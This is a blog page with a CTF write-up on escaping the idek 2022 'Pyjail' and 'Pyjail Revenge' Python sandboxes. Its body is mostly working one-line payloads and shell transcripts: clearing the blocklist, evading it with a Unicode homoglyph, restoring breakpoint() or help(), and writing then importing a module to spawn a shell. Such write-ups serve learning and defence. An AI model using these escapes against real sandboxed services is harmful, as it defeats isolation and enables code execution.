<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup | crazyman_army's blog</title><meta name="author" content="crazyman_army"><meta name="copyright" content="crazyman_army"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge WriteupPyjail:The code looks like this 123blocklist &#x3D; [&amp;#x27;.&amp;#x27;, &amp;#x27;\\&amp;#x27;, &amp;#x27;[&amp;#x27;, &amp;#x27;]&amp;#x27;, &amp;#x27;&amp;#123;&amp;#x27;, &amp;#x27;&amp;#125;&amp;#x2">
<meta property="og:type" content="article">
<meta property="og:title" content="idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup">
<meta property="og:url" content="https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html">
<meta property="og:site_name" content="crazyman_army&#39;s blog">
<meta property="og:description" content="idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge WriteupPyjail:The code looks like this 123blocklist &#x3D; [&amp;#x27;.&amp;#x27;, &amp;#x27;\\&amp;#x27;, &amp;#x27;[&amp;#x27;, &amp;#x27;]&amp;#x27;, &amp;#x27;&amp;#123;&amp;#x27;, &amp;#x27;&amp;#125;&amp;#x2">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2023/01/27/y7ElGdeCTWafXrh.png">
<meta property="article:published_time" content="2023-01-18T12:18:21.000Z">
<meta property="article:modified_time" content="2023-01-27T11:10:59.820Z">
<meta property="article:author" content="crazyman_army">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Pyjail">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/01/27/y7ElGdeCTWafXrh.png"><link rel="shortcut icon" href="https://s2.loli.net/2023/01/29/Duzv3pAYSsxaiVk.png"><link rel="canonical" href="https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'idek 2022* CTF Pyjail && Pyjail Revenge Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-27 19:10:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="crazyman_army's blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/01/27/XA2Yr7TuwcNWhOp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/01/27/y7ElGdeCTWafXrh.png')"><nav id="nav"><span id="blog-info"><a href="/" title="crazyman_army's blog"><img class="site-icon" src="https://s2.loli.net/2023/01/29/Duzv3pAYSsxaiVk.png"/><span class="site-name">crazyman_army's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-01-18T12:18:21.000Z" title="Created 2023-01-18 20:18:21">2023-01-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-01-27T11:10:59.820Z" title="Updated 2023-01-27 19:10:59">2023-01-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="idek-2022-CTF-Pyjail-amp-amp-Pyjail-Revenge-Writeup"><a href="#idek-2022-CTF-Pyjail-amp-amp-Pyjail-Revenge-Writeup" class="headerlink" title="idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup"></a>idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup</h1><h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail:"></a>Pyjail:</h2><p>The code looks like this</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blocklist = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>]</span><br><span class="line">DISABLE_FUNCTIONS = [<span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;breakpoint&quot;</span>, <span class="string">&quot;lambda&quot;</span>, <span class="string">&quot;help&quot;</span>]</span><br><span class="line">DISABLE_FUNCTIONS = &#123;func: <span class="literal">None</span> <span class="keyword">for</span> func <span class="keyword">in</span> DISABLE_FUNCTIONS&#125;</span><br></pre></td></tr></table></figure>

<p>There is a blocklist ban off <code>&#39;.&#39; , &#39;\\&#39;, &#39;[&#39;, &#39;]&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;, &#39;:&#39;</code>. Then there is a <code>DISABLE_FUNCTIONS</code> that registers None objects for <code>&#39;getattr&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;breakpoint&#39;, &#39;lambda&#39;, &#39;help&#39;</code> and overrides the corresponding functions in <code>__builtins__</code>. Also, the file name is <code>jail.py</code>, and the one in docker is also jail, so you can use <code>__import__(&#39;jail&#39;)</code>, but you may have to type it twice, so it’s better to use <code>__import__(__main__)</code>.<br>Also flag sets permission not to read directly and then gives a readflag, called with the argument <code>/readflag giveflag</code><br>Also, this question can be executed in multiple lines, so you can do something like emptying the blocklist as follows</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;__main__&#x27;</span>),<span class="string">&#x27;blocklist&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">jail.py  readflag.c</span></span><br><span class="line"><span class="string">$ ls /</span></span><br><span class="line"><span class="string">bin   ctf  etc   home  lib    media  opt   readflag  run   srv  tmp  var</span></span><br><span class="line"><span class="string">boot  dev  flag  kctf  lib64  mnt    proc  root      sbin  sys  usr</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;9eece9b4de9380bc3a41777a8884c185&#125;</span></span><br></pre></td></tr></table></figure>

<p>There is of course a second version that uses <code>__import__(&#39;jail&#39;)</code> to load, but it seems to have to be exploited twice</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;jail&#x27;</span>),<span class="string">&#x27;blocklist&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;jail&#x27;</span>),<span class="string">&#x27;blocklist&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;9eece9b4de9380bc3a41777a8884c185&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Pyjail-Revenge"><a href="#Pyjail-Revenge" class="headerlink" title="Pyjail Revenge:"></a>Pyjail Revenge:</h2><p>Not solved during the game Repeated after the game</p>
<p>The difference between the Revenge version and the normal version is that blocklist adds <code>blocklist</code>, <code>globals</code> and <code>compile</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blocklist = [<span class="string">&#x27;.&#x27;</span> , <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&quot;blocklist&quot;</span>, <span class="string">&quot;globals&quot;</span>, <span class="string">&quot;compile&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>You can only enter one line at a time, not multiple times, so the previous solution does not work at the moment. However, the following versions can be tried</p>
<h3 id="Method-1-remove-overlay"><a href="#Method-1-remove-overlay" class="headerlink" title="Method 1 remove overlay:"></a>Method 1 remove overlay:</h3><p><code>DISABLE_FUNCTIONS</code> registers the None objects of <code>&quot;getattr&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;breakpoint&quot;, &quot;lambda&quot;, &quot;help&quot;</code> and overrides the corresponding functions in its <code>__builtins__</code>, so just delete the overridden global variables OK<br>The global variable can pass <code>globals()</code>, <code>vars()</code>, <code>locals()</code>, etc. Of course, it can also bypass the blocklist in the form of unicode, such as <code>gloｂals</code>, so that the function in <code>DISABLE_FUNCTIONS</code> can be deleted and then called.<br>For example, first use <code>setattr</code> to cover <code>__dict__</code> of some useless classes with <code>globals()</code>, <code>vars()</code>, <code>locals()</code>, then <code>delete</code> those <code>ISABLE_FUNCTIONS</code> through delattr, and then call</p>
<p>For example:<br><code>vars()</code>, <code>locals()</code> can be used</p>
<p>Override copyright and call the breakpoint function</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(copyright,<span class="string">&#x27;__dict__&#x27;</span>,gloｂals()),<span class="built_in">delattr</span>(copyright,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">welcome!</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; setattr(copyright,&#x27;</span>__dict__<span class="string">&#x27;,vars()),delattr(copyright,&#x27;</span><span class="built_in">breakpoint</span><span class="string">&#x27;),breakpoint()</span></span><br><span class="line"><span class="string">--Return--</span></span><br><span class="line"><span class="string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;(None, None, None)</span></span><br><span class="line"><span class="string">(Pdb) import os;os.system(&#x27;</span>sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sh: 0: can&#x27;</span>t access tty; job control turned off</span><br><span class="line">$ /readflag giveflag</span><br><span class="line">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span><br><span class="line"></span><br><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(copyright,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">locals</span>()),<span class="built_in">delattr</span>(copyright,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br></pre></td></tr></table></figure>

<p>Override the license to call the breakpoint function</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(license,<span class="string">&#x27;__dict__&#x27;</span>,gloｂals()),<span class="built_in">delattr</span>(license,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">welcome!</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; setattr(license,&#x27;</span>__dict__<span class="string">&#x27;,vars()),delattr(license,&#x27;</span><span class="built_in">breakpoint</span><span class="string">&#x27;),breakpoint()</span></span><br><span class="line"><span class="string">--Return--</span></span><br><span class="line"><span class="string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;(None, None, None)</span></span><br><span class="line"><span class="string">(Pdb) import os;os.system(&#x27;</span>sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sh: 0: can&#x27;</span>t access tty; job control turned off</span><br><span class="line">$ /readflag giveflag</span><br><span class="line">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span><br><span class="line"></span><br><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(license,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">locals</span>()),<span class="built_in">delattr</span>(license,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br></pre></td></tr></table></figure>
<p>The parameters related to coverage can be found in these:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426">https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426</a><br><code>quit,copyright,exit,license,credits</code></p>
<p>Of course, because of this version, he is such a startup parameter</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> socat \</span></span><br><span class="line"><span class="language-bash">    TCP-LISTEN:1337,reuseaddr,fork,end-close \</span></span><br><span class="line"><span class="language-bash">    EXEC:<span class="string">&quot;./jail.py&quot;</span>,pty,ctty,stderr,raw,<span class="built_in">echo</span>=0</span></span><br></pre></td></tr></table></figure>

<p>So you can also delete help() and then use help() to rce again, but the remote environment may have some restrictions that may cause /tmp to disappear, /tmp is unreadable, but it can work locally</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(license,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">locals</span>()),<span class="built_in">delattr</span>(license,<span class="string">&#x27;help&#x27;</span>),<span class="built_in">help</span>()</span><br><span class="line"></span><br><span class="line">Welcome to Python <span class="number">3.8</span><span class="string">&#x27;s help utility!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If this is your first time using Python, you should definitely check out</span></span><br><span class="line"><span class="string">the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter the name of any module, keyword, or topic to get help on writing</span></span><br><span class="line"><span class="string">Python programs and using Python modules.  To quit this help utility and</span></span><br><span class="line"><span class="string">return to the interpreter, just type &quot;quit&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To get a list of available modules, keywords, symbols, or topics, type</span></span><br><span class="line"><span class="string">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span></span><br><span class="line"><span class="string">with a one-line summary of what it does; to list the modules whose name</span></span><br><span class="line"><span class="string">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">help&gt; os</span></span><br><span class="line"><span class="string">[Errno 2] No usable temporary directory found in [&#x27;</span>/tmp<span class="string">&#x27;, &#x27;</span>/var/tmp<span class="string">&#x27;, &#x27;</span>/usr/tmp<span class="string">&#x27;, &#x27;</span>/home/use<span class="string">r&#x27;]</span></span><br></pre></td></tr></table></figure>

<h3 id="Method-2-Modify-sys-path-write-the-file-and-then-import"><a href="#Method-2-Modify-sys-path-write-the-file-and-then-import" class="headerlink" title="Method 2 Modify sys.path, write the file and then import:"></a>Method 2 Modify sys.path, write the file and then import:</h3><p>It consists of the following parts</p>
<ol>
<li>Overwrite the property of <code>sys.path</code> through setattr, covering it as writable <code>/dev/shm</code></li>
<li>Then pass the file parameter of the print function <a target="_blank" rel="noopener" href="https://blog.csdn.net/no_giveup/article/details/72017925">https://blog.csdn.net/no_giveup/article/details/72017925</a>, and then use open to open and write.<code>.</code> will be Replaced with <code>chr(46)</code></li>
<li>Use <code>__import__</code> to load the written file name, and then execute the code</li>
</ol>
<p>which are respectively</p>
<ol>
<li><code>setattr(__import__(&quot;sys&quot;), &quot;path&quot;, list((&quot;/dev/shm/&quot;,)))</code></li>
<li><code>print(&quot;import os&quot; + chr(10) + &quot;print(os&quot; + chr(46) + &quot;system(&#39;/readflag giveflag&#39;))&quot;, file=open(&quot;/dev/shm/exp&quot; + chr(46) + &quot;py&quot;, &quot;w&quot;))</code></li>
<li><code>__import__(&quot;exp&quot;)</code></li>
</ol>
<p>final payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;sys&quot;</span>), <span class="string">&quot;path&quot;</span>, <span class="built_in">list</span>((<span class="string">&quot;/dev/shm/&quot;</span>,))), <span class="built_in">print</span>(<span class="string">&quot;import os&quot;</span> + <span class="built_in">chr</span>(<span class="number">10</span>) + <span class="string">&quot;print(os&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;system(&#x27;/readflag giveflag&#x27;))&quot;</span>, file=<span class="built_in">open</span>(<span class="string">&quot;/dev/shm/exp&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;py&quot;</span>, <span class="string">&quot;w&quot;</span>)), <span class="built_in">__import__</span>(<span class="string">&quot;exp&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>result:</p>
